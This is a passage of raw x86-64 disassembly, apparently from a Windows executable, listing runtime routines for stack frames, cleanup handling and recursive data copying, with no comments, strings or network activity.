  4080eb:	48 89 c7             	mov    %rax,%rdi
  4080ee:	e8 2f a5 ff ff       	call   0x402622
  4080f3:	45 31 c0             	xor    %r8d,%r8d
  4080f6:	48 89 f9             	mov    %rdi,%rcx
  4080f9:	48 89 c2             	mov    %rax,%rdx
  4080fc:	48 8b 05 5d f0 00 00 	mov    0xf05d(%rip),%rax        # 0x417160
  408103:	ff 10                	call   *(%rax)
  408105:	85 c0                	test   %eax,%eax
  408107:	0f 85 c0 00 00 00    	jne    0x4081cd
  40810d:	e8 8e f8 ff ff       	call   0x4079a0
  408112:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
  408117:	ba 10 00 00 00       	mov    $0x10,%edx
  40811c:	89 c7                	mov    %eax,%edi
  40811e:	e8 29 c0 ff ff       	call   0x40414c
  408123:	48 89 f1             	mov    %rsi,%rcx
  408126:	e8 b2 0a 00 00       	call   0x408bdd
  40812b:	48 89 d9             	mov    %rbx,%rcx
  40812e:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  408133:	48 8d 5c 24 28       	lea    0x28(%rsp),%rbx
  408138:	e8 a0 0a 00 00       	call   0x408bdd
  40813d:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
  408142:	48 8d 0d 07 ea 00 00 	lea    0xea07(%rip),%rcx        # 0x416b50
  408149:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
  408150:	00 00 
  408152:	48 89 c6             	mov    %rax,%rsi
  408155:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
  40815a:	e8 7e 0a 00 00       	call   0x408bdd
  40815f:	48 89 d9             	mov    %rbx,%rcx
  408162:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  408167:	48 89 ea             	mov    %rbp,%rdx
  40816a:	e8 48 d2 ff ff       	call   0x4053b7
  40816f:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
  408174:	ba 02 00 00 00       	mov    $0x2,%edx
  408179:	e8 a0 cf ff ff       	call   0x40511e
  40817e:	48 8d 15 ab e9 00 00 	lea    0xe9ab(%rip),%rdx        # 0x416b30
  408185:	48 89 c1             	mov    %rax,%rcx
  408188:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  40818d:	e8 95 de ff ff       	call   0x406027
  408192:	48 89 f2             	mov    %rsi,%rdx
  408195:	48 89 d9             	mov    %rbx,%rcx
  408198:	e8 1a d2 ff ff       	call   0x4053b7
  40819d:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
  4081a2:	ba 01 00 00 00       	mov    $0x1,%edx
  4081a7:	e8 72 cf ff ff       	call   0x40511e
  4081ac:	48 8d 15 5d e9 00 00 	lea    0xe95d(%rip),%rdx        # 0x416b10
  4081b3:	48 89 c1             	mov    %rax,%rcx
  4081b6:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  4081bb:	e8 67 de ff ff       	call   0x406027
  4081c0:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
  4081c5:	89 f9                	mov    %edi,%ecx
  4081c7:	e8 d4 fe ff ff       	call   0x4080a0
  4081cc:	90                   	nop
  4081cd:	48 83 c4 48          	add    $0x48,%rsp
  4081d1:	5b                   	pop    %rbx
  4081d2:	5e                   	pop    %rsi
  4081d3:	5f                   	pop    %rdi
  4081d4:	5d                   	pop    %rbp
  4081d5:	c3                   	ret
  4081d6:	48 83 ec 28          	sub    $0x28,%rsp
  4081da:	e8 38 a9 ff ff       	call   0x402b17
  4081df:	31 d2                	xor    %edx,%edx
  4081e1:	48 8b 88 60 34 00 00 	mov    0x3460(%rax),%rcx
  4081e8:	48 83 c4 28          	add    $0x28,%rsp
  4081ec:	e9 46 bb ff ff       	jmp    0x403d37
  4081f1:	48 83 ec 28          	sub    $0x28,%rsp
  4081f5:	e8 1d a9 ff ff       	call   0x402b17
  4081fa:	31 d2                	xor    %edx,%edx
  4081fc:	48 8b 88 58 34 00 00 	mov    0x3458(%rax),%rcx
  408203:	48 83 c4 28          	add    $0x28,%rsp
  408207:	e9 2b bb ff ff       	jmp    0x403d37
  40820c:	48 83 ec 28          	sub    $0x28,%rsp
  408210:	e8 02 a9 ff ff       	call   0x402b17
  408215:	31 d2                	xor    %edx,%edx
  408217:	48 8b 88 48 34 00 00 	mov    0x3448(%rax),%rcx
  40821e:	48 83 c4 28          	add    $0x28,%rsp
  408222:	e9 10 bb ff ff       	jmp    0x403d37
  408227:	48 83 ec 28          	sub    $0x28,%rsp
  40822b:	e8 e7 a8 ff ff       	call   0x402b17
  408230:	31 d2                	xor    %edx,%edx
  408232:	48 8b 88 40 34 00 00 	mov    0x3440(%rax),%rcx
  408239:	48 83 c4 28          	add    $0x28,%rsp
  40823d:	e9 f5 ba ff ff       	jmp    0x403d37
  408242:	56                   	push   %rsi
  408243:	53                   	push   %rbx
  408244:	48 83 ec 38          	sub    $0x38,%rsp
  408248:	48 8b 05 61 f7 00 00 	mov    0xf761(%rip),%rax        # 0x4179b0
  40824f:	48 8b 31             	mov    (%rcx),%rsi
  408252:	48 89 cb             	mov    %rcx,%rbx
  408255:	48 89 f2             	mov    %rsi,%rdx
  408258:	8b 08                	mov    (%rax),%ecx
  40825a:	ff 15 74 31 03 00    	call   *0x33174(%rip)        # 0x43b3d4
  408260:	48 8d 05 4f 00 00 00 	lea    0x4f(%rip),%rax        # 0x4082b6
  408267:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
  40826c:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  408271:	e8 66 0d 00 00       	call   0x408fdc
  408276:	e8 2f b9 ff ff       	call   0x403baa
  40827b:	48 89 d9             	mov    %rbx,%rcx
  40827e:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
  408283:	ff d0                	call   *%rax
  408285:	e8 8d a8 ff ff       	call   0x402b17
  40828a:	48 8d 88 a0 00 00 00 	lea    0xa0(%rax),%rcx
  408291:	e8 56 08 00 00       	call   0x408aec
  408296:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
  40829d:	48 89 f1             	mov    %rsi,%rcx
  4082a0:	48 c7 43 10 00 00 00 	movq   $0x0,0x10(%rbx)
  4082a7:	00 
  4082a8:	e8 07 08 00 00       	call   0x408ab4
  4082ad:	31 c0                	xor    %eax,%eax
  4082af:	48 83 c4 38          	add    $0x38,%rsp
  4082b3:	5b                   	pop    %rbx
  4082b4:	5e                   	pop    %rsi
  4082b5:	c3                   	ret
  4082b6:	55                   	push   %rbp
  4082b7:	57                   	push   %rdi
  4082b8:	56                   	push   %rsi
  4082b9:	53                   	push   %rbx
  4082ba:	48 89 e5             	mov    %rsp,%rbp
  4082bd:	48 81 ec a8 01 00 00 	sub    $0x1a8,%rsp
  4082c4:	48 8d 9d e8 fe ff ff 	lea    -0x118(%rbp),%rbx
  4082cb:	48 89 4d 28          	mov    %rcx,0x28(%rbp)
  4082cf:	e8 43 a8 ff ff       	call   0x402b17
  4082d4:	48 89 d9             	mov    %rbx,%rcx
  4082d7:	48 89 85 90 fe ff ff 	mov    %rax,-0x170(%rbp)
  4082de:	e8 26 dd ff ff       	call   0x406009
  4082e3:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
  4082e7:	48 89 ea             	mov    %rbp,%rdx
  4082ea:	e8 59 33 00 00       	call   0x40b648
  4082ef:	48 98                	cltq
  4082f1:	48 85 c0             	test   %rax,%rax
  4082f4:	48 89 85 f0 fe ff ff 	mov    %rax,-0x110(%rbp)
  4082fb:	0f 85 61 01 00 00    	jne    0x408462
  408301:	48 8d 9d a8 fe ff ff 	lea    -0x158(%rbp),%rbx
  408308:	ba 20 00 00 00       	mov    $0x20,%edx
  40830d:	48 8d b5 c8 fe ff ff 	lea    -0x138(%rbp),%rsi
  408314:	48 89 d9             	mov    %rbx,%rcx
  408317:	e8 30 be ff ff       	call   0x40414c
  40831c:	ba 20 00 00 00       	mov    $0x20,%edx
  408321:	48 89 f1             	mov    %rsi,%rcx
  408324:	e8 23 be ff ff       	call   0x40414c
  408329:	48 8b 45 28          	mov    0x28(%rbp),%rax
  40832d:	8a 40 18             	mov    0x18(%rax),%al
  408330:	88 85 c8 fe ff ff    	mov    %al,-0x138(%rbp)
  408336:	48 8b 45 28          	mov    0x28(%rbp),%rax
  40833a:	48 8b 40 20          	mov    0x20(%rax),%rax
  40833e:	48 89 85 d0 fe ff ff 	mov    %rax,-0x130(%rbp)
  408345:	48 8b 45 28          	mov    0x28(%rbp),%rax
  408349:	48 8b 40 28          	mov    0x28(%rax),%rax
  40834d:	48 89 85 d8 fe ff ff 	mov    %rax,-0x128(%rbp)
  408354:	48 8b 45 28          	mov    0x28(%rbp),%rax
  408358:	48 8b 40 30          	mov    0x30(%rax),%rax
  40835c:	48 89 85 e0 fe ff ff 	mov    %rax,-0x120(%rbp)
  408363:	e8 af a7 ff ff       	call   0x402b17
  408368:	b9 10 02 00 00       	mov    $0x210,%ecx
  40836d:	48 ff 80 98 00 00 00 	incq   0x98(%rax)
  408374:	e8 cd a2 ff ff       	call   0x402646
  408379:	4c 8b 05 c0 f2 00 00 	mov    0xf2c0(%rip),%r8        # 0x417640
  408380:	48 89 f2             	mov    %rsi,%rdx
  408383:	48 89 d9             	mov    %rbx,%rcx
  408386:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
  40838d:	4c 8d 8d a0 fe ff ff 	lea    -0x160(%rbp),%r9
  408394:	48 c7 40 08 1f 00 00 	movq   $0x1f,0x8(%rax)
  40839b:	00 
  40839c:	48 89 85 a0 fe ff ff 	mov    %rax,-0x160(%rbp)
  4083a3:	e8 46 03 00 00       	call   0x4086ee
  4083a8:	48 8b 8d a0 fe ff ff 	mov    -0x160(%rbp),%rcx
  4083af:	e8 2a b5 ff ff       	call   0x4038de
  4083b4:	e8 5e a7 ff ff       	call   0x402b17
  4083b9:	48 83 b8 98 00 00 00 	cmpq   $0x0,0x98(%rax)
  4083c0:	00 
  4083c1:	48 89 c6             	mov    %rax,%rsi
  4083c4:	7e 1a                	jle    0x4083e0
  4083c6:	48 8b 45 28          	mov    0x28(%rbp),%rax
  4083ca:	48 8d 8d a8 fe ff ff 	lea    -0x158(%rbp),%rcx
  4083d1:	48 ff 8e 98 00 00 00 	decq   0x98(%rsi)
  4083d8:	ff 50 10             	call   *0x10(%rax)
  4083db:	e9 82 00 00 00       	jmp    0x408462
  4083e0:	48 8b 0d 99 f2 00 00 	mov    0xf299(%rip),%rcx        # 0x417680
  4083e7:	ba 30 00 00 00       	mov    $0x30,%edx
  4083ec:	e8 51 ce ff ff       	call   0x405242
  4083f1:	48 8d 0d 08 e6 00 00 	lea    0xe608(%rip),%rcx        # 0x416a00
  4083f8:	48 89 c3             	mov    %rax,%rbx
  4083fb:	48 8b 05 fe f1 00 00 	mov    0xf1fe(%rip),%rax        # 0x417600
  408402:	48 8b 7b 18          	mov    0x18(%rbx),%rdi
  408406:	48 89 03             	mov    %rax,(%rbx)
  408409:	48 8d 05 c5 e5 00 00 	lea    0xe5c5(%rip),%rax        # 0x4169d5
  408410:	48 89 43 10          	mov    %rax,0x10(%rbx)
  408414:	e8 81 cd ff ff       	call   0x40519a
  408419:	48 85 ff             	test   %rdi,%rdi
  40841c:	48 89 43 18          	mov    %rax,0x18(%rbx)
  408420:	75 36                	jne    0x408458
  408422:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
  408426:	31 d2                	xor    %edx,%edx
  408428:	e8 2f bd ff ff       	call   0x40415c
  40842d:	4c 8d 0d b0 e5 00 00 	lea    0xe5b0(%rip),%r9        # 0x4169e4
  408434:	48 89 d9             	mov    %rbx,%rcx
  408437:	48 c7 44 24 20 4e 03 	movq   $0x34e,0x20(%rsp)
  40843e:	00 00 
  408440:	4c 8d 05 a4 e5 00 00 	lea    0xe5a4(%rip),%r8        # 0x4169eb
  408447:	48 8d 15 87 e5 00 00 	lea    0xe587(%rip),%rdx        # 0x4169d5
  40844e:	e8 62 d7 ff ff       	call   0x405bb5
  408453:	e9 6e ff ff ff       	jmp    0x4083c6
  408458:	48 89 f9             	mov    %rdi,%rcx
  40845b:	e8 a0 58 00 00       	call   0x40dd00
  408460:	eb c0                	jmp    0x408422
  408462:	e8 4a db ff ff       	call   0x405fb1
  408467:	48 8b 85 90 fe ff ff 	mov    -0x170(%rbp),%rax
  40846e:	31 db                	xor    %ebx,%ebx
  408470:	48 8b 40 08          	mov    0x8(%rax),%rax
  408474:	48 85 c0             	test   %rax,%rax
  408477:	74 03                	je     0x40847c
  408479:	48 8b 18             	mov    (%rax),%rbx
  40847c:	48 ff cb             	dec    %rbx
  40847f:	48 85 db             	test   %rbx,%rbx
  408482:	78 25                	js     0x4084a9
  408484:	48 8b bd 90 fe ff ff 	mov    -0x170(%rbp),%rdi
  40848b:	48 89 d8             	mov    %rbx,%rax
  40848e:	48 c1 e0 04          	shl    $0x4,%rax
  408492:	48 03 47 08          	add    0x8(%rdi),%rax
  408496:	48 8b 48 18          	mov    0x18(%rax),%rcx
  40849a:	48 85 c9             	test   %rcx,%rcx
  40849d:	74 05                	je     0x4084a4
  40849f:	ff 50 10             	call   *0x10(%rax)
  4084a2:	eb d8                	jmp    0x40847c
  4084a4:	ff 50 10             	call   *0x10(%rax)
  4084a7:	eb d3                	jmp    0x40847c
  4084a9:	48 83 bd f0 fe ff ff 	cmpq   $0x0,-0x110(%rbp)
  4084b0:	00 
  4084b1:	74 06                	je     0x4084b9
  4084b3:	e8 c4 0b 00 00       	call   0x40907c
  4084b8:	90                   	nop
  4084b9:	48 81 c4 a8 01 00 00 	add    $0x1a8,%rsp
  4084c0:	5b                   	pop    %rbx
  4084c1:	5e                   	pop    %rsi
  4084c2:	5f                   	pop    %rdi
  4084c3:	5d                   	pop    %rbp
  4084c4:	c3                   	ret
  4084c5:	90                   	nop
  4084c6:	90                   	nop
  4084c7:	90                   	nop
  4084c8:	90                   	nop
  4084c9:	90                   	nop
  4084ca:	90                   	nop
  4084cb:	90                   	nop
  4084cc:	90                   	nop
  4084cd:	90                   	nop
  4084ce:	90                   	nop
  4084cf:	90                   	nop
  4084d0:	c3                   	ret
  4084d1:	e9 ef f3 ff ff       	jmp    0x4078c5
  4084d6:	e9 ea f3 ff ff       	jmp    0x4078c5
  4084db:	e9 e5 f3 ff ff       	jmp    0x4078c5
  4084e0:	e9 e0 f3 ff ff       	jmp    0x4078c5
  4084e5:	55                   	push   %rbp
  4084e6:	57                   	push   %rdi
  4084e7:	56                   	push   %rsi
  4084e8:	53                   	push   %rbx
  4084e9:	48 83 ec 28          	sub    $0x28,%rsp
  4084ed:	8a 42 08             	mov    0x8(%rdx),%al
  4084f0:	3c 12                	cmp    $0x12,%al
  4084f2:	48 89 ce             	mov    %rcx,%rsi
  4084f5:	48 89 d3             	mov    %rdx,%rbx
  4084f8:	74 2c                	je     0x408526
  4084fa:	77 0c                	ja     0x408508
  4084fc:	3c 10                	cmp    $0x10,%al
  4084fe:	74 46                	je     0x408546
  408500:	77 32                	ja     0x408534
  408502:	3c 04                	cmp    $0x4,%al
  408504:	74 40                	je     0x408546
  408506:	eb 6d                	jmp    0x408575
  408508:	3c 18                	cmp    $0x18,%al
  40850a:	74 08                	je     0x408514
  40850c:	3c 1c                	cmp    $0x1c,%al
  40850e:	74 04                	je     0x408514
  408510:	3c 16                	cmp    $0x16,%al
  408512:	75 61                	jne    0x408575
  408514:	31 d2                	xor    %edx,%edx
  408516:	48 89 f1             	mov    %rsi,%rcx
  408519:	48 83 c4 28          	add    $0x28,%rsp
  40851d:	5b                   	pop    %rbx
  40851e:	5e                   	pop    %rsi
  40851f:	5f                   	pop    %rdi
  408520:	5d                   	pop    %rbp
  408521:	e9 53 ce ff ff       	jmp    0x405379
  408526:	48 8b 52 18          	mov    0x18(%rdx),%rdx
  40852a:	48 83 c4 28          	add    $0x28,%rsp
  40852e:	5b                   	pop    %rbx
  40852f:	5e                   	pop    %rsi
  408530:	5f                   	pop    %rdi
  408531:	5d                   	pop    %rbp
  408532:	eb 5d                	jmp    0x408591
  408534:	48 8b 52 18          	mov    0x18(%rdx),%rdx
  408538:	e8 54 00 00 00       	call   0x408591
  40853d:	48 c7 06 00 00 00 00 	movq   $0x0,(%rsi)
  408544:	eb 42                	jmp    0x408588
  408546:	48 8b 03             	mov    (%rbx),%rax
  408549:	31 ed                	xor    %ebp,%ebp
  40854b:	48 8b 7b 10          	mov    0x10(%rbx),%rdi
  40854f:	48 99                	cqto
  408551:	48 f7 3f             	idivq  (%rdi)
  408554:	48 8d 78 ff          	lea    -0x1(%rax),%rdi
  408558:	48 39 ef             	cmp    %rbp,%rdi
  40855b:	7c 2b                	jl     0x408588
  40855d:	48 8b 53 10          	mov    0x10(%rbx),%rdx
  408561:	48 89 e9             	mov    %rbp,%rcx
  408564:	48 ff c5             	inc    %rbp
  408567:	48 0f af 0a          	imul   (%rdx),%rcx
  40856b:	48 01 f1             	add    %rsi,%rcx
  40856e:	e8 72 ff ff ff       	call   0x4084e5
  408573:	eb e3                	jmp    0x408558
  408575:	48 8b 13             	mov    (%rbx),%rdx
  408578:	48 89 f1             	mov    %rsi,%rcx
  40857b:	48 83 c4 28          	add    $0x28,%rsp
  40857f:	5b                   	pop    %rbx
  408580:	5e                   	pop    %rsi
  408581:	5f                   	pop    %rdi
  408582:	5d                   	pop    %rbp
  408583:	e9 c4 bb ff ff       	jmp    0x40414c
  408588:	48 83 c4 28          	add    $0x28,%rsp
  40858c:	5b                   	pop    %rbx
  40858d:	5e                   	pop    %rsi
  40858e:	5f                   	pop    %rdi
  40858f:	5d                   	pop    %rbp
  408590:	c3                   	ret
  408591:	55                   	push   %rbp
  408592:	57                   	push   %rdi
  408593:	56                   	push   %rsi
  408594:	53                   	push   %rbx
  408595:	48 83 ec 28          	sub    $0x28,%rsp
  408599:	8a 02                	mov    (%rdx),%al
  40859b:	3c 02                	cmp    $0x2,%al
  40859d:	48 89 cb             	mov    %rcx,%rbx
  4085a0:	48 89 d6             	mov    %rdx,%rsi
  4085a3:	74 20                	je     0x4085c5
  4085a5:	3c 03                	cmp    $0x3,%al
  4085a7:	74 40                	je     0x4085e9
  4085a9:	fe c8                	dec    %al
  4085ab:	75 6c                	jne    0x408619
  4085ad:	48 03 5e 08          	add    0x8(%rsi),%rbx
  4085b1:	48 8b 52 10          	mov    0x10(%rdx),%rdx
  4085b5:	48 89 d9             	mov    %rbx,%rcx
  4085b8:	48 83 c4 28          	add    $0x28,%rsp
  4085bc:	5b                   	pop    %rbx
  4085bd:	5e                   	pop    %rsi
  4085be:	5f                   	pop    %rdi
  4085bf:	5d                   	pop    %rbp
  4085c0:	e9 20 ff ff ff       	jmp    0x4084e5
  4085c5:	48 8b 42 20          	mov    0x20(%rdx),%rax
  4085c9:	31 ff                	xor    %edi,%edi
  4085cb:	48 8d 68 ff          	lea    -0x1(%rax),%rbp
  4085cf:	48 39 ef             	cmp    %rbp,%rdi
  4085d2:	7f 45                	jg     0x408619
  4085d4:	48 8b 46 28          	mov    0x28(%rsi),%rax
  4085d8:	48 89 d9             	mov    %rbx,%rcx
  4085db:	48 8b 14 f8          	mov    (%rax,%rdi,8),%rdx
  4085df:	48 ff c7             	inc    %rdi
  4085e2:	e8 aa ff ff ff       	call   0x408591
  4085e7:	eb e6                	jmp    0x4085cf
  4085e9:	e8 e0 b0 ff ff       	call   0x4036ce
  4085ee:	48 85 c0             	test   %rax,%rax
  4085f1:	74 0b                	je     0x4085fe
  4085f3:	48 89 c2             	mov    %rax,%rdx
  4085f6:	48 89 d9             	mov    %rbx,%rcx
  4085f9:	e8 93 ff ff ff       	call   0x408591
  4085fe:	48 8b 46 10          	mov    0x10(%rsi),%rax
  408602:	48 03 5e 08          	add    0x8(%rsi),%rbx
  408606:	48 8b 10             	mov    (%rax),%rdx
  408609:	48 89 d9             	mov    %rbx,%rcx
  40860c:	48 83 c4 28          	add    $0x28,%rsp
  408610:	5b                   	pop    %rbx
  408611:	5e                   	pop    %rsi
  408612:	5f                   	pop    %rdi
  408613:	5d                   	pop    %rbp
  408614:	e9 33 bb ff ff       	jmp    0x40414c
  408619:	48 83 c4 28          	add    $0x28,%rsp
  40861d:	5b                   	pop    %rbx
  40861e:	5e                   	pop    %rsi
  40861f:	5f                   	pop    %rdi
  408620:	5d                   	pop    %rbp
  408621:	c3                   	ret
  408622:	55                   	push   %rbp
  408623:	57                   	push   %rdi
  408624:	56                   	push   %rsi
  408625:	53                   	push   %rbx
  408626:	48 83 ec 28          	sub    $0x28,%rsp
  40862a:	31 ed                	xor    %ebp,%ebp
  40862c:	48 89 cf             	mov    %rcx,%rdi
  40862f:	48 89 cb             	mov    %rcx,%rbx
  408632:	0f b6 f2             	movzbl %dl,%esi
  408635:	48 85 ff             	test   %rdi,%rdi
  408638:	74 2e                	je     0x408668
  40863a:	48 83 c3 38          	add    $0x38,%rbx
  40863e:	48 3b 2f             	cmp    (%rdi),%rbp
  408641:	7d 25                	jge    0x408668
  408643:	48 8b 4b f8          	mov    -0x8(%rbx),%rcx
  408647:	89 f2                	mov    %esi,%edx
  408649:	48 ff c5             	inc    %rbp
  40864c:	e8 e6 b6 ff ff       	call   0x403d37
  408651:	48 8b 0b             	mov    (%rbx),%rcx
  408654:	89 f2                	mov    %esi,%edx
  408656:	e8 dc b6 ff ff       	call   0x403d37
  40865b:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
  40865f:	89 f2                	mov    %esi,%edx
  408661:	e8 d1 b6 ff ff       	call   0x403d37
  408666:	eb cd                	jmp    0x408635
  408668:	48 83 c4 28          	add    $0x28,%rsp
  40866c:	5b                   	pop    %rbx
  40866d:	5e                   	pop    %rsi
  40866e:	5f                   	pop    %rdi
  40866f:	5d                   	pop    %rbp
  408670:	c3                   	ret
  408671:	56                   	push   %rsi
  408672:	53                   	push   %rbx
  408673:	48 83 ec 28          	sub    $0x28,%rsp
  408677:	48 89 ce             	mov    %rcx,%rsi
  40867a:	48 8b 49 08          	mov    0x8(%rcx),%rcx
  40867e:	0f b6 da             	movzbl %dl,%ebx
  408681:	89 da                	mov    %ebx,%edx
  408683:	e8 af b6 ff ff       	call   0x403d37
  408688:	48 8b 4e 18          	mov    0x18(%rsi),%rcx
  40868c:	89 da                	mov    %ebx,%edx
  40868e:	e8 a4 b6 ff ff       	call   0x403d37
  408693:	48 8b 4e 20          	mov    0x20(%rsi),%rcx
  408697:	89 da                	mov    %ebx,%edx
  408699:	e8 99 b6 ff ff       	call   0x403d37
  40869e:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
  4086a2:	89 da                	mov    %ebx,%edx
  4086a4:	48 83 c4 28          	add    $0x28,%rsp
  4086a8:	5b                   	pop    %rbx
  4086a9:	5e                   	pop    %rsi
  4086aa:	e9 88 b6 ff ff       	jmp    0x403d37
  4086af:	57                   	push   %rdi
  4086b0:	56                   	push   %rsi
  4086b1:	48 83 ec 28          	sub    $0x28,%rsp
  4086b5:	48 85 c9             	test   %rcx,%rcx
  4086b8:	48 89 ce             	mov    %rcx,%rsi
  4086bb:	74 27                	je     0x4086e4
  4086bd:	48 8b 09             	mov    (%rcx),%rcx
  4086c0:	48 83 c6 10          	add    $0x10,%rsi
  4086c4:	e8 13 13 00 00       	call   0x4099dc
  4086c9:	48 8b 56 f0          	mov    -0x10(%rsi),%rdx
  4086cd:	48 89 10             	mov    %rdx,(%rax)
  4086d0:	48 8b 7e f0          	mov    -0x10(%rsi),%rdi
  4086d4:	48 8d 50 10          	lea    0x10(%rax),%rdx
  4086d8:	48 8d 4f 01          	lea    0x1(%rdi),%rcx
  4086dc:	48 89 d7             	mov    %rdx,%rdi
  4086df:	f3 a4                	rep movsb (%rsi),(%rdi)
  4086e1:	48 89 c6             	mov    %rax,%rsi
  4086e4:	48 89 f0             	mov    %rsi,%rax
  4086e7:	48 83 c4 28          	add    $0x28,%rsp
  4086eb:	5e                   	pop    %rsi
  4086ec:	5f                   	pop    %rdi
  4086ed:	c3                   	ret
  4086ee:	41 57                	push   %r15
  4086f0:	41 56                	push   %r14
  4086f2:	41 55                	push   %r13
  4086f4:	41 54                	push   %r12
  4086f6:	55                   	push   %rbp
  4086f7:	57                   	push   %rdi
  4086f8:	56                   	push   %rsi
  4086f9:	53                   	push   %rbx
  4086fa:	48 83 ec 38          	sub    $0x38,%rsp
  4086fe:	4c 8d 2d 7b e4 00 00 	lea    0xe47b(%rip),%r13        # 0x416b80
  408705:	48 89 cb             	mov    %rcx,%rbx
  408708:	48 89 d6             	mov    %rdx,%rsi
  40870b:	4c 89 c7             	mov    %r8,%rdi
  40870e:	4c 89 cd             	mov    %r9,%rbp
  408711:	8a 47 08             	mov    0x8(%rdi),%al
  408714:	83 e8 04             	sub    $0x4,%eax
  408717:	3c 18                	cmp    $0x18,%al
  408719:	0f 87 9d 02 00 00    	ja     0x4089bc
  40871f:	0f b6 c0             	movzbl %al,%eax
  408722:	49 63 44 85 00       	movslq 0x0(%r13,%rax,4),%rax
  408727:	4c 01 e8             	add    %r13,%rax
  40872a:	ff e0                	jmp    *%rax
  40872c:	48 8b 0e             	mov    (%rsi),%rcx
  40872f:	48 85 c9             	test   %rcx,%rcx
  408732:	0f 84 ed 00 00 00    	je     0x408825
  408738:	e8 72 ff ff ff       	call   0x4086af
  40873d:	e9 fc 00 00 00       	jmp    0x40883e
  408742:	48 8b 36             	mov    (%rsi),%rsi
  408745:	48 85 f6             	test   %rsi,%rsi
  408748:	0f 84 d7 00 00 00    	je     0x408825
  40874e:	48 8b 16             	mov    (%rsi),%rdx
  408751:	48 89 f9             	mov    %rdi,%rcx
  408754:	48 83 c6 10          	add    $0x10,%rsi
  408758:	e8 99 d6 ff ff       	call   0x405df6
  40875d:	48 89 d9             	mov    %rbx,%rcx
  408760:	48 89 c2             	mov    %rax,%rdx
  408763:	e8 11 cc ff ff       	call   0x405379
  408768:	4c 8b 2b             	mov    (%rbx),%r13
  40876b:	31 db                	xor    %ebx,%ebx
  40876d:	48 8b 46 f0          	mov    -0x10(%rsi),%rax
  408771:	49 83 c5 10          	add    $0x10,%r13
  408775:	4c 8d 60 ff          	lea    -0x1(%rax),%r12
  408779:	4c 39 e3             	cmp    %r12,%rbx
  40877c:	0f 8f 42 02 00 00    	jg     0x4089c4
  408782:	4c 8b 47 10          	mov    0x10(%rdi),%r8
  408786:	48 89 d9             	mov    %rbx,%rcx
  408789:	49 89 e9             	mov    %rbp,%r9
  40878c:	48 ff c3             	inc    %rbx
  40878f:	49 0f af 08          	imul   (%r8),%rcx
  408793:	48 8d 14 0e          	lea    (%rsi,%rcx,1),%rdx
  408797:	4c 01 e9             	add    %r13,%rcx
  40879a:	e8 4f ff ff ff       	call   0x4086ee
  40879f:	eb d8                	jmp    0x408779
  4087a1:	4c 8b 47 10          	mov    0x10(%rdi),%r8
  4087a5:	4d 85 c0             	test   %r8,%r8
  4087a8:	74 10                	je     0x4087ba
  4087aa:	49 89 e9             	mov    %rbp,%r9
  4087ad:	48 89 f2             	mov    %rsi,%rdx
  4087b0:	48 89 d9             	mov    %rbx,%rcx
  4087b3:	e8 36 ff ff ff       	call   0x4086ee
  4087b8:	eb 06                	jmp    0x4087c0
  4087ba:	48 8b 06             	mov    (%rsi),%rax
  4087bd:	48 89 03             	mov    %rax,(%rbx)
  4087c0:	4c 8b 47 18          	mov    0x18(%rdi),%r8
  4087c4:	49 89 e9             	mov    %rbp,%r9
  4087c7:	48 89 f2             	mov    %rsi,%rdx
  4087ca:	48 89 d9             	mov    %rbx,%rcx
  4087cd:	48 83 c4 38          	add    $0x38,%rsp
  4087d1:	5b                   	pop    %rbx
  4087d2:	5e                   	pop    %rsi
  4087d3:	5f                   	pop    %rdi
  4087d4:	5d                   	pop    %rbp
  4087d5:	41 5c                	pop    %r12
  4087d7:	41 5d                	pop    %r13
  4087d9:	41 5e                	pop    %r14
  4087db:	41 5f                	pop    %r15
  4087dd:	e9 f3 01 00 00       	jmp    0x4089d5
  4087e2:	48 8b 07             	mov    (%rdi),%rax
  4087e5:	45 31 e4             	xor    %r12d,%r12d
  4087e8:	48 8b 4f 10          	mov    0x10(%rdi),%rcx
  4087ec:	48 99                	cqto
  4087ee:	48 f7 39             	idivq  (%rcx)
  4087f1:	4c 8d 68 ff          	lea    -0x1(%rax),%r13
  4087f5:	4d 39 ec             	cmp    %r13,%r12
  4087f8:	0f 8f c6 01 00 00    	jg     0x4089c4
  4087fe:	4c 8b 47 10          	mov    0x10(%rdi),%r8
  408802:	4c 89 e1             	mov    %r12,%rcx
  408805:	49 89 e9             	mov    %rbp,%r9
  408808:	49 ff c4             	inc    %r12
  40880b:	49 0f af 08          	imul   (%r8),%rcx
  40880f:	48 8d 14 0e          	lea    (%rsi,%rcx,1),%rdx
  408813:	48 01 d9             	add    %rbx,%rcx
  408816:	e8 d3 fe ff ff       	call   0x4086ee
  40881b:	eb d8                	jmp    0x4087f5
  40881d:	48 8b 36             	mov    (%rsi),%rsi
  408820:	48 85 f6             	test   %rsi,%rsi
  408823:	75 07                	jne    0x40882c
  408825:	31 d2                	xor    %edx,%edx
  408827:	e9 58 01 00 00       	jmp    0x408984
  40882c:	48 8b 47 10          	mov    0x10(%rdi),%rax
  408830:	48 8b 40 30          	mov    0x30(%rax),%rax
  408834:	48 85 c0             	test   %rax,%rax
  408837:	74 0d                	je     0x408846
  408839:	48 89 f1             	mov    %rsi,%rcx
  40883c:	ff d0                	call   *%rax
  40883e:	48 89 c2             	mov    %rax,%rdx
  408841:	e9 3e 01 00 00       	jmp    0x408984
  408846:	48 8b 4d 00          	mov    0x0(%rbp),%rcx
  40884a:	48 89 f7             	mov    %rsi,%rdi
  40884d:	48 c1 ff 08          	sar    $0x8,%rdi
  408851:	48 89 fa             	mov    %rdi,%rdx
  408854:	4c 8b 49 08          	mov    0x8(%rcx),%r9
